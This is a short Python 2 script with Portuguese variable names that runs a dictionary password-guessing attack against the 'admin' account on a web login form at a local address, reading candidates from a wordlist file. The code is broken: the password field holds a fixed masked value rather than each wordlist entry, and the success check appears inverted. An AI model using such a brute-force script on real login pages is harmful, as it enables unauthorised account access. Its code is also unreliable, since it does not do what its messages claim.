import requests

url = "http://127.0.0.1/"

arquivo = open('dicionario2.txt')
linhas = arquivo.readlines()

for linha in linhas:
	dados = {'form-username': 'admin',
        	'form-password': '******'}

	resposta = requests.post(url, data=dados)

	print resposta.text

	if "Entre com o seu" in resposta.text:
	    print "Senha Correta:", linha
	else:
	    print "Senha Incorreta:", linha
